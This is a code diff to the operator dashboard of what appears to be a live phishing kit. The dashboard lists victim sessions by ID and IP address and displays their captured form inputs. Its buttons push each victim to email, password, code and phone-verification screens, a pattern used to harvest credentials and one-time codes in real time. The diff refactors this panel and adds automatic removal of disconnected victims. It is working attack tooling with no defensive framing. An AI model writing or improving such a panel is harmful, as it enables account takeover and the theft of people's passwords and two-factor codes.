@@ -251,41 +251,56 @@
     }
 
     function updateClients(data) {
-        data.clientList.sort((a, b) => b.timestamp - a.timestamp);
-        clientsDiv.innerHTML = '';
+    data.clientList.sort((a, b) => b.timestamp - a.timestamp);
 
-        data.clientList.forEach(client => {
-            const clientDiv = document.createElement('div');
-            clientDiv.classList.add('client');
+    const clientsDiv = document.getElementById('clients');
+    clientsDiv.innerHTML = '';
 
-            const inputsHtml = Object.entries(JSON.parse(client.inputs)).map(([key, value]) => `<p>${key}: ${value}</p>`).join('');
-            clientDiv.innerHTML = `
-                <div style="display:flex; align-items:center;">
-                    <div class="thisName" id="${client.clientId}"></div>
-                    <h3 style="margin-right: 10px;">Client: ${client.clientId} IP: ${client.ip}</h3>
-                    <div class="container">
-                        <div class="circle"></div>
-                        <div id="currPage-${client.clientId}" class="currPage"></div>
-                    </div>
+    data.clientList.forEach(client => {
+        const clientDiv = document.createElement('div');
+        clientDiv.classList.add('client');
+        clientDiv.setAttribute('id', `client-${client.clientId}`);
+
+        const inputsHtml = Object.entries(client.inputs).map(([key, value]) => `<p>${key}: ${value}</p>`).join('');
+        clientDiv.innerHTML = `
+            <div style="display:flex; align-items:center;">
+                <div class="thisName" id="${client.clientId}"></div>
+                <h3 style="margin-right: 10px;">Client: ${client.clientId} IP: ${client.ip}</h3>
+                <div class="container">
+                    <div class="circle"></div>
+                    <div id="currPage-${client.clientId}" class="currPage"></div>
                 </div>
-                <button onclick="sendCommand('${client.clientId}', 'emailScreen')">Email Screen</button>
-                <button onclick="sendCommand('${client.clientId}', 'passwordScreen')">Password Screen</button>
-                <button onclick="sendCommand('${client.clientId}', 'loadScreen')">Load Screen</button>
-                <button onclick="sendCommand('${client.clientId}', 'codePage')">Code Page</button>
-                <button onclick="sendCommand('${client.clientId}', 'verifyPhone')">Verify Page</button>
-                <button onclick="sendCommand('${client.clientId}', 'loadPage')">Load Page</button>
-                <button onclick="viewInputs('${client.clientId}')">View Inputs</button>
-                <button onclick="deleteClient('${client.clientId}')">Delete</button>
-                <div id="inputs-${client.clientId}" class="inputs">
-                    <h4>Inputs:</h4>
-                    ${inputsHtml}
-                </div>
-            `;
+            </div>
+            <button onclick="sendCommand('${client.clientId}', 'emailScreen')">Email Screen</button>
+            <button onclick="sendCommand('${client.clientId}', 'passwordScreen')">Password Screen</button>
+            <button onclick="sendCommand('${client.clientId}', 'loadScreen')">Load Screen</button>
+            <button onclick="sendCommand('${client.clientId}', 'codePage')">Code Page</button>
+            <button onclick="sendCommand('${client.clientId}', 'verifyPhone')">Verify Page</button>
+            <button onclick="sendCommand('${client.clientId}', 'loadPage')">Load Page</button>
+            <button onclick="viewInputs('${client.clientId}')">View Inputs</button>
+            <button onclick="deleteClient('${client.clientId}')">Delete</button>
+            <div id="inputs-${client.clientId}" class="inputs">
+                <h4>Inputs:</h4>
+                ${inputsHtml}
+            </div>
+        `;
 
-            clientsDiv.prepend(clientDiv);
-            updateCurrPage(client.clientId, data.currPage);
-        });
-    }
+        clientsDiv.prepend(clientDiv);
+
+        // Update currPage and circle color
+        updateCurrPage(client.clientId, data.currPage.currPage, client.isConnected);
+
+        // Schedule removal of disconnected clients after 30 seconds
+        if (!client.isConnected) {
+            setTimeout(() => {
+                const clientToRemove = document.getElementById(`client-${client.clientId}`);
+                if (clientToRemove) {
+                    clientToRemove.remove();
+                }
+            }, 30000); // 30 seconds
+        }
+    });
+}
 
     async function sendCommand(clientId, command) {
         console.log('Sending command:', command, 'to clientId:', clientId);
